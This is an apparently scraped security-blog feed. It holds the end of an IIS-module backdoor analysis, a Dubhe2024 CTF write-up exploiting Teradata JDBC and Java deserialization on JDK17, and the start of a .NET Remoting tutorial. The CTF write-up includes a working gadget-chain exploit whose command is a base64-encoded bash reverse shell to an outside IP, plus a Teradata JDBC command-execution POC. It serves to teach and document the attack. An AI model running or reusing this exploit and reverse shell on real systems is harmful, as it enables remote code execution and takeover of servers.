class="keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="number">0x40</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> UInt32 MEM_COMMIT = <span class="number">0x1000</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这是在写IHttpModule接口之前写的代码  我们来分析这个代码是干啥的  直接掏gpt的答案过来问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这段代码是用来调用 Windows 操作系统的核心功能来创建进程并在远程进程中执行代码的。让我逐步解释一下：</span><br><span class="line"></span><br><span class="line">SecurityAttributes 结构体用于指定新进程和线程的安全属性。这个结构体包含了安全描述符、长度和一个布尔值，指示新进程或线程是否继承了句柄的访问权限。</span><br><span class="line"></span><br><span class="line">ProcessInformation 结构体包含了有关新创建进程的信息，例如进程句柄、主线程句柄以及进程和线程的标识号。</span><br><span class="line"></span><br><span class="line">CreateProcessFlags 枚举定义了创建进程时的一系列标志位，比如是否调试进程、是否创建一个新的控制台窗口等。</span><br><span class="line"></span><br><span class="line">StartupInfo 结构体包含了一系列启动信息，例如窗口显示方式、标准输入输出等。</span><br><span class="line"></span><br><span class="line">接下来是一系列的 DllImport 属性，用于声明对 kernel32.dll 中的一些函数的引用，这些函数包括：</span><br><span class="line"></span><br><span class="line">CreateProcessA: 创建一个新进程和它的主线程。</span><br><span class="line">VirtualAllocEx: 在远程进程的虚拟地址空间中分配内存。</span><br><span class="line">WriteProcessMemory: 写入数据到远程进程的内存中。</span><br><span class="line">CreateRemoteThread: 在远程进程中创建一个新的线程并从指定地址开始执行。</span><br><span class="line">最后，定义了一些常量，用于指定内存分配和权限。这些常量在调用上述函数时用作参数。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>综合来看，这段代码的主要功能是通过调用 Windows 操作系统提供的函数，实现了创建进程、在远程进程中分配内存、写入数据以及在远程进程中创建线程并执行代码的功能。</strong></p><p>接着看其的核心Module代码</p><p><img src="../images/image-20240404165243402.png" alt="image-20240404165243402"></p><p>都是大同小异  都是在这个Init函数中选订阅事件来进行处理  只不过这里用的是<code>BeginRequest</code> 用的不是<code>PreRequestHandlerExecute</code>   两者的差别应该不大  都是在请求之前进行处理</p><p><img src="../images/image-20240404165549929.png" alt="image-20240404165549929"></p><p>这些事作者写的几个功能点  代码和上面写的都差不多</p><p><img src="../images/image-20240404165840282.png" alt="image-20240404165840282"></p><p>然后走进这个函数  获取到请求  就会走进context_filter函数中去</p><p><img src="../images/image-20240404165917703.png" alt="image-20240404165917703"></p><p>在这个函数中就先获取我们的请求  看看事cmd还是什么  使用if来进行判断  判断成功获取cookie的value值  并且走进对应的函数进行执行</p><p>想要加什么功能点的话就直接写对应的函数  然后再<code>context_filter</code>这个函数中添加if判断就行了</p><p>(可能在学内存马的时候我会写一写)</p><p>ui就不分析了</p><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p> <code>HttpContext</code> 和 <code>HttpRequest</code> 之间的关系。</p><ol><li><strong>HttpRequest</strong>：<code>HttpRequest</code> 是 <code>HttpContext</code> 中的一部分，它代表了 HTTP 请求的具体内容，包括 URL、HTTP 方法、请求头、查询参数等。通过 <code>HttpRequest</code> 对象，你可以获取请求的具体内容。</li><li><strong>HttpContext</strong>：<code>HttpContext</code> 对象包含了当前 HTTP 请求的上下文信息，包括 <code>HttpRequest</code>、<code>HttpResponse</code>、<code>HttpServerUtility</code> 等属性。它提供了对整个请求和响应的访问和操作。所以，通过 <code>HttpContext</code>，你可以获取到当前请求的 <code>HttpRequest</code> 对象，进而访问请求的具体内容。</li></ol><p>所以，虽然 <code>Request</code> 属性通常用于获取请求的具体内容，但它实际上是 <code>HttpContext</code> 对象中的一个属性。通过 <code>Request</code>，你可以直接获取到当前请求的 <code>HttpRequest</code> 对象，进而获取请求的参数等信息。</p><p>综上所述，通过 <code>Request</code> 或 <code>HttpContext.Request</code>，你都可以获取到当前请求的参数等信息，只不过前者是通过 <code>HttpContext</code> 对象的属性访问，后者是直接通过 <code>HttpContext</code> 对象的一个属性访问。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://y4er.com/posts/using-csharp-to-develop-the-iis-module-backdoor/#%E5%8F%82%E8%80%83&quot;&gt;https://y4er.com/posts/using-csharp-</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dubhe2024-Javolution</title>
    <link href="https://ke1nys.github.io/posts/84f22eff.html"/>
    <id>https://ke1nys.github.io/posts/84f22eff.html</id>
    <published>2024-03-19T07:06:34.000Z</published>
    <updated>2024-04-18T12:57:04.535Z</updated>
    
    <content type="html"><![CDATA[<p>因为之前再看那个绕高版本的jdk的jndi注入的时候  就有提到用jndi转JDBC来打  当时就是看看  没有实践  现在刚好这次比赛出了jdk17打JDBC的题  这里就记录一下</p><h2 id="Teradata-JDBC"><a href="#Teradata-JDBC" class="headerlink" title="Teradata JDBC"></a>Teradata JDBC</h2><p><a href="https://i.blackhat.com/Asia-23/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf">https://i.blackhat.com/Asia-23/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf</a></p><p><a href="https://github.com/luelueking/Deserial_Sink_With_JDBC">https://github.com/luelueking/Deserial_Sink_With_JDBC</a></p><p>python运行那两个脚本就行了</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><img src="../images/image-20240319152109847.png" alt="image-20240319152109847"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException, IOException &#123;</span><br><span class="line">        DriverManager.registerDriver(<span class="keyword">new</span> <span class="title class_">com</span>.teradata.jdbc.TeraDriver());</span><br><span class="line">        DriverManager.getConnection(<span class="string">&quot;jdbc:teradata://127.0.0.1/DBS_PORT=10250,LOGMECH=BROWSER,BROWSER=&#x27;calc&#x27;,TYPE=DEFAULT,COP=OFF,TMODE=TERA,LOG=DEBUG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240319152202551.png" alt="image-20240319152202551"></p><p>跟进这个getConnection函数</p><p><img src="../images/image-20240319152250143.png" alt="image-20240319152250143"></p><p>再次跟进这个getConnection函数中去</p><p><img src="../images/image-20240319152322791.png" alt="image-20240319152322791"></p><p>接着跟进这个connnect函数中</p><p><img src="../images/image-20240319152340172.png" alt="image-20240319152340172"></p><p>跟进doConnect函数中</p><p><img src="../images/image-20240319152433806.png" alt="image-20240319152433806"></p><p>这个函数会拆分我们传入的url参数  并将值挨个提取出来</p><p><img src="../images/image-20240319152521730.png" alt="image-20240319152521730"></p><p>接着跟进createConnection函数中</p><p><img src="../images/image-20240319152548590.png" alt="image-20240319152548590"></p><p>再次跟进createConnection函数中</p><p><img src="../images/image-20240319152752314.png" alt="image-20240319152752314"></p><p>满足if判断  进入到TDSession函数中</p><p><img src="../images/image-20240319152833423.png" alt="image-20240319152833423"></p><p><img src="../images/image-20240319152901528.png" alt="image-20240319152901528"></p><p>携带我们传入的参数进入到其父类的构造函数中去</p><p><img src="../images/image-20240319152932248.png" alt="image-20240319152932248"></p><p>最后在GenericTeradataConnection的构造函数中执行了命令</p><p>这就是这个漏洞的成因  那么我们就只需要找到前半段链子来连接上getConnetion就行了</p><p>(接下来回归到题目本身)</p><h2 id="Javolution"><a href="#Javolution" class="headerlink" title="Javolution"></a>Javolution</h2><p><a href="https://blog.wm-team.cn/index.php/archives/72/">https://blog.wm-team.cn/index.php/archives/72/</a></p><p><img src="../images/image-20240319153754054.png" alt="image-20240319153754054"></p><p><img src="../images/image-20240319153804494.png" alt="image-20240319153804494"></p><p>反序列化入口在这里   在进入到这里之前  我们得绕过两个限制</p><p><img src="../images/image-20240319153936320.png" alt="image-20240319153936320"></p><p>一个是等级一个是域名限制    </p><p><img src="../images/image-20240319154007589.png" alt="image-20240319154007589"></p><p><img src="../images/image-20240319154035790.png" alt="image-20240319154035790"></p><p>等级用整数溢出绕过</p><p>域名用sudo.cc绕过  <code>xx.sudo.cc</code>也是指向127.0.0.1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url/pal/cheat?defense=-2147483647</span><br><span class="line">url/pal/battle/flag</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240319154212483.png" alt="image-20240319154212483"></p><p>这样的话就绕过上面的两个限制了</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><p><strong>(这里打成功一次  第二次就打不通了  不知道啥原因  md)</strong></p><p>这里本是想直接<code>BadAttributeValueExpException</code>当入口点来打的</p><p>但是BadAttr的val属性，在java8是Object类型，在jdk17中是String类型</p><p>那么我们其实就可以换成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hashmap-&gt;Xstring-&gt;Pojonode-&gt;getter</span><br><span class="line">就是将BadAttributeValueExpException换成了HashMap+Xstring</span><br></pre></td></tr></table></figure><p>还有一点就是这哥jdk17 <code>ban</code>了反射  不给我们直接用</p><p><img src="../images/image-20240320101721963.png" alt="image-20240320101721963"></p><p>原因是这个module的原因  但是我们可以在<code>configurations</code>来进行修改  这也算个trick  我们可以通过java的option开启模块，反序列化并不会检验  所以就可以不用绕这个module了</p><p><img src="../images/image-20240320104928149.png" alt="image-20240320104928149"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--add-opens java.base/java.util=ALL-UNNAMED --add-exports  java.xml/com.sun.org.apache.xpath.internal.objects=ALL-UNNAMED</span><br><span class="line"></span><br><span class="line">--add-exports java.xml/com.sun.org.apache.xpath.internal.objects=ALL-UNNAMED</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"><span class="comment">//import com.fasterxml.jackson.databind.node.POJONode;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//import com.fasterxml.jackson.databind.node.POJONode;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="comment">//import com.sun.org.apache.xpath.internal.objects.XString;</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> org.dubhe.javolution.pool.PalDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    static &#123;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            // javassist 修改 BaseJsonNode</span></span><br><span class="line"><span class="comment">//            ClassPool classPool = ClassPool.getDefault();</span></span><br><span class="line"><span class="comment">//            CtClass ctClass = classPool.getCtClass(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);</span></span><br><span class="line"><span class="comment">//            CtMethod writeReplace = ctClass.getDeclaredMethod(&quot;writeReplace&quot;);</span></span><br><span class="line"><span class="comment">//            writeReplace.setBody(&quot;return $0;&quot;);</span></span><br><span class="line"><span class="comment">//            ctClass.writeFile();</span></span><br><span class="line"><span class="comment">//            ctClass.toClass();</span></span><br><span class="line"><span class="comment">//        &#125; catch (Exception e)&#123;</span></span><br><span class="line"><span class="comment">//            e.printStackTrace();</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuMTk5LjEwLjEwMy81NDE4NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>;</span><br><span class="line">        <span class="type">PalDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PalDataSource</span>();</span><br><span class="line">        dataSource.setBROWSER(command);</span><br><span class="line">        dataSource.setLOGMECH(<span class="string">&quot;BROWSER&quot;</span>);</span><br><span class="line">        dataSource.setDSName(<span class="string">&quot;192.168.52.129&quot;</span>);</span><br><span class="line">        dataSource.setDbsPort(<span class="string">&quot;10251&quot;</span>);</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(dataSource);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;DataSource.class&#125;, handler);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxy);</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xx&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>, a);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>, xString);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>, xString);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>, a);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, map1, map1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, map2, map2, <span class="literal">null</span>));</span><br><span class="line"></span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bytes);</span><br><span class="line">        objectOutputStream.writeObject(s);</span><br><span class="line">        <span class="type">byte</span>[] output = Base64.getEncoder().encode(bytes.toByteArray());</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;guoke.ser&quot;</span>));</span><br><span class="line">        fout.write(bytes.toByteArray());</span><br><span class="line">        fout.close();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(output));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] input = Base64.getDecoder().decode(output);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(input);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line"><span class="comment">//        objectInputStream.readObject();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <img src="../images/image-20240320105038907.png" alt="image-20240320105038907"></p><p>生成payload后直接打就行了</p><p><img src="../images/image-20240320105105325.png" alt="image-20240320105105325"></p><p>记得把fakeserver和fakesso给运行起来</p><p><img src="../images/image-20240320105135806.png" alt="image-20240320105135806"></p><p><img src="../images/image-20240320105142579.png" alt="image-20240320105142579"></p><p>然后就能打成功了</p><p>接着上面提到过的  为什么不直接调用<code>TeraDataSource</code>的getconnection方法   因为这里的话会调用到TeraDataSource的getParentLogger方法  导致报错  但是如果调用的是<code>PalDataSource</code>的话 因为这个类继承于TeraDataSource  然后就会调用到TeraDataSource的getconnetion方法  这样就不会报错了</p><p><strong>(因为这个PalDataSource是有参getconnect方法  会调用到TeraDataSource里的那个有参getconnect方法  如果使用TeraDataSource来打的话就会调用到其中的无参getconnect方法  导致调用到getParentLogger报错)</strong></p><p>晚点再写一下那个N1-j的那几道题  也是打jdk17的jdbc来RCE</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;因为之前再看那个绕高版本的jdk的jndi注入的时候  就有提到用jndi转JDBC来打  当时就是看看  没有实践  现在刚好这次比赛出了jdk17打JDBC的题  这里就记录一下&lt;/p&gt;
&lt;h2 id=&quot;Teradata-JDBC&quot;&gt;&lt;a href=&quot;#Teradata</summary>
      
    
    
    
    
    <category term="java" scheme="https://ke1nys.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-13</title>
    <link href="https://ke1nys.github.io/posts/53ee4a5a.html"/>
    <id>https://ke1nys.github.io/posts/53ee4a5a.html</id>
    <published>2024-03-14T06:35:32.000Z</published>
    <updated>2024-04-18T12:57:04.533Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/.NET%20Remoting.md">https://github.com/Y4er/dotnet-deserialization/blob/main/.NET%20Remoting.md</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>.net remoting是一种在不同进程间传递对象的方式。假如两个不同的进程分别为服务端、客户端，客户端和服务端各自保存相同的一份对象（DLL），那么可以通过.net remoting技术来远程传递对象。拿java来讲更类似于rmi的概念。</p><p>.net remoting可以使用tcp、http、ipc协议来传输远程对象</p><h2 id="三种协议的不同"><a href="#三种协议的不同" class="headerlink" title="三种协议的不同"></a>三种协议的不同</h2><p>三种协议都位于程序集System.Runtime.Remoting.dll，命名空间分别为System.Runtime.Remoting.Channels.Http、System.Runtime.Remoting.Channels.Tcp、System.Runtime.Remoting.Channels.Ipc</p><p><img src="../images/image-20240314145028945.png" alt="image-20240314145028945"></p><p>其中不同协议用处不同：</p><ol><li>IpcChannel用于本机之间进程传输，使用ipc协议传输比HTTP、TCP速度要快的多，但是只能在本机传输，不能跨机器，本文不讲。</li><li>TcpChannel基于tcp传输，将对象进行二进制序列化之后传输二进制数据流，比http传输效率更高。</li><li>HttpChannel基于http传输，将对象进行soap序列化之后在网络中传输xml，兼容性更强。</li></ol><h2 id="net-remoting"><a href="#net-remoting" class="headerlink" title=".net remoting"></a>.net remoting</h2><p>先来以HttpChannel为例看一个demo了解.net remoting。需要三个项目，分别是</p><ol><li>RemoteDemoClient</li><li>RemoteDemoServer</li><li>RemoteDemoObject</li></ol><p>分别表示<strong>客户端</strong>、<strong>服务端</strong>和<strong>要传输的对象</strong>。</p><h2 id="RemoteDemoObject-传输对象类"><a href="#RemoteDemoObject-传输对象类" class="headerlink" title="RemoteDemoObject(传输对象类)"></a>RemoteDemoObject(传输对象类)</h2><p>RemoteDemoObject.RemoteDemoObjectClass需要继承MarshalByRefObject类才能跨域（AppDomain）远程传输。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting.Metadata;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">RemoteDemoObject</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">RemoteDemoObjectClass</span> : <span class="title">MarshalByRefObject</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> count = <span class="number">0</span>;</span><br><span class="line">        [<span class="meta">SoapMethod(XmlNamespace = <span class="string">&quot;RemoteDemoObject1&quot;</span>, SoapAction = <span class="string">&quot;RemoteDemoObject#GetCount&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">int</span> <span class="title">GetCount</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;GetCount called.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里在客户端和服务端的必须加上这个<code>SoapMethod</code>  不然会报错</p><p><img src="../images/image-20240314165435864.png" alt="image-20240314165435864"></p><p><a href="https://blog.csdn.net/sloder/article/details/8694560">https://blog.csdn.net/sloder/article/details/8694560</a></p><h2 id="RemoteDemoServer-服务端"><a href="#RemoteDemoServer-服务端" class="headerlink" title="RemoteDemoServer(服务端)"></a>RemoteDemoServer(服务端)</h2><p>服务端注册HttpServerChannel并绑定在9999端口，然后<code>RemotingConfiguration.RegisterWellKnownServiceType</code>发布uri地址为RemoteDemoObjectClass.rem的远程调用对象，类型是RemoteDemoObjectClass。    </p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting.Channels;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting.Channels.Http;</span><br><span class="line"><span class="keyword">using</span> RemoteDemoObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">RemoteDemoServer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            HttpServerChannel httpServerChannel = <span class="keyword">new</span> HttpServerChannel(<span class="number">9999</span>);</span><br><span class="line">            ChannelServices.RegisterChannel(httpServerChannel, <span class="literal">false</span>);</span><br><span class="line">            RemotingConfiguration.RegisterWellKnownServiceType(<span class="keyword">typeof</span>(RemoteDemoObjectClass), <span class="string">&quot;RemoteDemoObjectClass.rem&quot;</span>, WellKnownObjectMode.Singleton);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(<span class="string">&quot;server has been 